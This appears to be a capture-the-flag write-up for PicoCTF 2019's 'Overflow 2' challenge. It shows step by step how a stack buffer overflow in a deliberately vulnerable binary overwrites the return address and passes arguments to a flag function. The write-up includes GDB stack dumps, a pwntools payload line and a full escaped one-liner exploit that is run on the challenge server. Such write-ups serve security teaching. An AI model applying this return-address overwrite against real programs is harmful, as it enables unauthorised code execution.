# Overflow 2 | PicoCTF2019
## Problem
Now try overwriting arguments. Can you get the flag from this program? You can find it in /problems/overflow-2_5_4db6d300831e973c59360066ec1cf0a4 on the shell server.
  
## Solution
Reference:  
- https://medium.com/@iseethieves/intro-to-rop-rop-emporium-split-9b2ec6d4db08

### 1. Read the code to understand what's going on.
In order for the program to output the flag, two arguments must be set for the flag function:
```c
void flag(unsigned int arg1, unsigned int arg2) {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
...
  fgets(buf,FLAGSIZE,f);
  if (arg1 != 0xDEADBEEF)
    return;
  if (arg2 != 0xC0DED00D)
    return;
  printf(buf);
}
```

### 2. Find the flag function
First of all, we need to jump to the flag function. Similar to what was done for Overload 1, we can first find the address for this function in which the flag is printed.
```bash
kali@kali:~/Desktop$ objdump -D vuln
...
 80485e3:       5d                      pop    %ebp
 80485e4:       eb 8a                   jmp    8048570 <register_tm_clones>

080485e6 <flag>:
 80485e6:       55                      push   %ebp
 80485e7:       89 e5                   mov    %esp,%ebp
 80485e9:       53                      push   %ebx
 80485ea:       83 ec 54                sub    $0x54,%esp
 80485ed:       e8 2e ff ff ff          call   8048520 <__x86.get_pc_thunk.bx>
 80485f2:       81 c3 0e 1a 00 00       add    $0x1a0e,%ebx
 80485f8:       83 ec 08                sub    $0x8,%esp
 80485fb:       8d 83 b0 e7 ff ff       lea    -0x1850(%ebx),%eax
 ...
```

### 3. Dynamic analysis
We can find out how to get to this function using GDB with pwntools.
```python
from pwn import *

p = process('./vuln')
gdb.attach(p)
print(p.recvline().decode())
p.sendline(cyclic(200))
```

When running we debug like so:
```bash
"./vuln": No such file or directory.
Attaching to process 2411
Reading symbols from /home/kali/Desktop/vuln...
(No debugging symbols found in /home/kali/Desktop/vuln)
Reading symbols from /lib32/libc.so.6...
(No debugging symbols found in /lib32/libc.so.6)
Reading symbols from /lib/ld-linux.so.2...
(No debugging symbols found in /lib/ld-linux.so.2)
0xf7f9e169 in __kernel_vsyscall ()
(gdb) ste
Ambiguous command "ste": step, stepi, stepping.
(gdb) step
Single stepping until exit from function __kernel_vsyscall,
which has no line number information.
0xf7e8c337 in read () from /lib32/libc.so.6
(gdb) step
Single stepping until exit from function read,
which has no line number information.
0xf7e1713b in _IO_file_underflow () from /lib32/libc.so.6
(gdb) step
Single stepping until exit from function _IO_file_underflow,
which has no line number information.
0xf7e184dc in _IO_default_uflow () from /lib32/libc.so.6
(gdb) step
Single stepping until exit from function _IO_default_uflow,
which has no line number information.
0xf7e0abb4 in gets () from /lib32/libc.so.6
(gdb) step
Single stepping until exit from function gets,
which has no line number information.
0x0804869a in vuln ()
(gdb) x/100x $sp
0xffb61eb0:     0xffb61ec0      0xf7f7cd67      0x00000001      0x08048685
0xffb61ec0:     0x61616161      0x61616162      0x61616163      0x61616164
0xffb61ed0:     0x61616165      0x61616166      0x61616167      0x61616168
0xffb61ee0:     0x61616169      0x6161616a      0x6161616b      0x6161616c
0xffb61ef0:     0x6161616d      0x6161616e      0x6161616f      0x61616170
0xffb61f00:     0x61616171      0x61616172      0x61616173      0x61616174
0xffb61f10:     0x61616175      0x61616176      0x61616177      0x61616178
0xffb61f20:     0x61616179      0x6261617a      0x62616162      0x62616163
0xffb61f30:     0x62616164      0x62616165      0x62616166      0x62616167
0xffb61f40:     0x62616168      0x62616169      0x6261616a      0x6261616b
0xffb61f50:     0x6261616c      0x6261616d      0x6261616e      0x6261616f
0xffb61f60:     0x62616170      0x62616171      0x62616172      0x62616173
0xffb61f70:     0x62616174      0x62616175      0x62616176      0x62616177 <--- saved eip (return function)
0xffb61f80:     0x62616178      0x62616179      0xffb62000      0x000003e8
0xffb61f90:     0xffb61fb0      0x00000000      0x00000000      0xf7dbaef1
0xffb61fa0:     0xf7f7c000      0xf7f7c000      0x00000000      0xf7dbaef1
0xffb61fb0:     0x00000001      0xffb62044      0xffb6204c      0xffb61fd4
0xffb61fc0:     0x00000001      0x00000000      0xf7f7c000      0x00000000
0xffb61fd0:     0xf7fc8000      0x00000000      0xf7f7c000      0xf7f7c000
0xffb61fe0:     0x00000000      0xe8f4a7e7      0x3396a1f7      0x00000000
0xffb61ff0:     0x00000000      0x00000000      0x00000001      0x080484d0
0xffb62000:     0x00000000      0xf7fb42c0      0xf7faf140      0x0804a000
0xffb62010:     0x00000001      0x080484d0      0x00000000      0x08048502
0xffb62020:     0x080486b5      0x00000001      0xffb62044      0x08048730
0xffb62030:     0x08048790      0xf7faf140      0xffb6203c      0x0000001c
(gdb) info frame
Stack level 0, frame at 0xffb61f80:
 eip = 0x804869a in vuln; saved eip = 0x62616177
 called by frame at 0xffb61f84
 Arglist at 0xffb61f78, args: 
 Locals at 0xffb61f78, Previous frame's sp is 0xffb61f80
 Saved registers:
  ebx at 0xffb61f74, ebp at 0xffb61f78, eip at 0xffb61f7c
```

### 4. Get to the flag function
Now we know where we need to go, we can overflow the buffer and overwrite eip, like so.
```python
p.sendline(b'A' * cyclic_find(0x62616177) + p32(0x080485e6))
```

Dubugger will now show the flag function being reached:
```bash
"./vuln": No such file or directory.
Attaching to process 2599
Reading symbols from /home/kali/Desktop/vuln...
(No debugging symbols found in /home/kali/Desktop/vuln)
Reading symbols from /lib32/libc.so.6...
(No debugging symbols found in /lib32/libc.so.6)
Reading symbols from /lib/ld-linux.so.2...
(No debugging symbols found in /lib/ld-linux.so.2)
0xf7f15169 in __kernel_vsyscall ()
(gdb) break flag
Breakpoint 1 at 0x80485ea
(gdb) continue
Continuing.

Breakpoint 1, 0x080485ea in flag ()
```

Now the flag function is being called, however it is not being supplied any arguments.  
We need to put arguments: 0xDEADBEEF and 0xC0DED00D on the stack in order for the flag to actually be printed.

### 5. Add the arguments
Arguments for a function are allocated below it's return address on the stack. Therefore we need to write them to the stack by supplying them after the return address.  

Once the flag function is called, the next item on the stack is the return address that would be followed for this function, so this also needs to be written past before we can drop the arguments in. During exploitation, this is what the stack ends up looking like:
```bash
0x0804869a in vuln ()
(gdb) x/100x $sp
0xffc2ee60:     0xffc2ee70      0xf7f25d67      0x00000001      0x08048685
0xffc2ee70:     0x41414141      0x41414141      0x41414141      0x41414141
0xffc2ee80:     0x41414141      0x41414141      0x41414141      0x41414141
0xffc2ee90:     0x41414141      0x41414141      0x41414141      0x41414141
0xffc2eea0:     0x41414141      0x41414141      0x41414141      0x41414141
0xffc2eeb0:     0x41414141      0x41414141      0x41414141      0x41414141
0xffc2eec0:     0x41414141      0x41414141      0x41414141      0x41414141
0xffc2eed0:     0x41414141      0x41414141      0x41414141      0x41414141
0xffc2eee0:     0x41414141      0x41414141      0x41414141      0x41414141
0xffc2eef0:     0x41414141      0x41414141      0x41414141      0x41414141
0xffc2ef00:     0x41414141      0x41414141      0x41414141      0x41414141
0xffc2ef10:     0x41414141      0x41414141      0x41414141      0x41414141
0xffc2ef20:     0x41414141      0x41414141      0x41414141      0x080485e6  <----- flag function address
0xffc2ef30:     0x41414141      0xdeadbeef      0xc0ded00d      0x00000300  <----- return address, arg1, arg2
```

### 6. Get the flag
First we can test this locally (see solve.py).
```bash
kali@kali:~/Desktop$ python solve.py 
[+] Starting local process './vuln': pid 2454
Please enter your string: 

[+] Receiving all data: Done (322B)
[*] Process './vuln' stopped with exit code 0 (pid 2454)
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�\x04AAAAﾭ����
Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.
```

Then on the server, the payload is provided as an escaped string (just for easy copy pasting).
```bash
jib1337@pico-2019-shell1:/problems/overflow-2_5_4db6d300831e973c59360066ec1cf0a4$ ls
flag.txt  vuln  vuln.c
jib1337@pico-2019-shell1:/problems/overflow-2_5_4db6d300831e973c59360066ec1cf0a4$ python -c "print('\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\xe6\x85\x04\x08\x41\x41\x41\x41\xef\xbe\xad\xde\x0d\xd0\xde\xc0')" | ./vuln
Please enter your string: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA���AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAﾭ�
picoCTF{arg5_and_r3turn5f5d490e6}Segmentation fault (core dumped)
```
